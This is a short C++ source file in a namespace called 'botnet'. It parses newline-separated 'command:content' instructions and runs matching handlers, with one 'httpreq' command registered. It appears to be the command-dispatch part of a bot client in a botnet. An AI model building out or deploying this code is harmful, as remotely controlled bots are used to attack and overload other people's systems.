#include "parser.h"
#include "commands.h"

#include <iostream>

namespace botnet {
    parser::parser(std::string src) :src_(src) {
        // TODO: the functions of commands should be declared here
        funcs_["httpreq"] = http_req;
    }

    void parser::execute() {
        std::vector<std::string> arr;
        std::string command = std::string("");
        std::string content = std::string("");
        cmd_map::iterator itr;
        int status = 0;

        arr = split(src_, "\n");

        for (size_t i = 0; i < arr.size(); i++) {
            std::size_t found = arr[i].find_first_of(":");
            command = arr[i].substr(0, found);
            content = arr[i].substr(found + 1);

            std::cout << "command: " << command << '\n';
            std::cout << "content: " << content << '\n';

            // if the command was defined in functions map
            // try execute the command
            itr = funcs_.find(command);
            if (itr != funcs_.end()) {
                status = itr->second(content);
            }
        }
    }
}